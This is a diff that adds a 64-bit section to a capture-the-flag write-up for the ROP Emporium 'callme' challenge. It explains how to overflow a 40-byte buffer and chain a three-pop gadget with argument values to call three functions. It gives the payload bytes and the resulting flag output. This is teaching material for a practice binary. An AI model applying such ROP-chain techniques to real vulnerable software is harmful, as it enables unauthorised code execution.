@@ -192,6 +192,58 @@ Hope you read the instructions...
 
 ## 64bit
 
+The challenge is similar to the 32bit one. We have to consider the different padding size of the 64bit version (see ret2win). A UsefulGadgets function which resembles the gadget we used in the 32bit version (3pop+1ret) can be found in the binary. A simple copy n paste of the 32bit ROP chain does not work. We have to analyze the program state during its execution to understand how to chain together the different addresses (easy to find them applying the same method of the 32bit version). Basically, we have the following addresses:
+```bash
+padding="A"*40
+gadget="\xb0\x1a\x40\x00\x00\x00\x00\x00"
+args="\x01\x00\x00\x00\x00\x00\x00\x00"+"\x02\x00\x00\x00\x00\x00\x00\x00"+"\x03\x00\x00\x00\x00\x00\x00\x00"
+call_one="\x50\x18\x40\x00\x00\x00\x00\x00"
+call_two="\x70\x18\x40\x00\x00\x00\x00\x00"
+call_three="\x10\x18\x40\x00\x00\x00\x00\x00"
+```
+
+### Build the ROP chain
+
+If we just chain call\_one to the padding we are able to reach call\_one (which address is resolved by the linker) but then the args' check fails. Analyzing where the args should be inserted in the stack:
+```bash
+0x7fffffffe198 # position of call_one
+0x7fffffffe198-0x14 # the position of the value which is compared with $0x1
+=
+0x7fffffffe184  # the position of the value which is compared with $0x1
+```
+We could insert the args with this offset respect to the call\_one address but the buffer is not large enough to fit all the addresses we need into it. So we have to resort to the gadget. Indeed, the scenario is simpler than the 32bit one, more standard I would say. Basically, if we directly jump to the gadget instead of call\_one, then the gadget will pop 3 addresses from the stack and then jump to the address on the top of the stack. So, we want to have a chain like this one:
+```bash
+padding+
+gadget+
+args+    # popped by the gadget
+call_one # jump through the gadget
+```
+
+### Execute the exploit
+
+The other calls are simple replicas of this pattern (gadget+args+call):
+```bash
+padding+
+gadget+
+args+       # popped by the gadget
+call_one+   # jump through the gadget
+gadget+
+args+       # popped by the gadget
+call_two+   # jump through the gadget
+gadget+
+args+       # popped by the gadget
+call_three  # jump through the gadget
+```
+
+Result:
+```bash
+callme by ROP Emporium
+64bits
+
+Hope you read the instructions...
+> ROPE{a_placeholder_32byte_flag!}
+```
+
 ## Tools
 
 * IDA pro: a multi-processor disassembler and debugger. The de-facto standard to dissassemble binaries
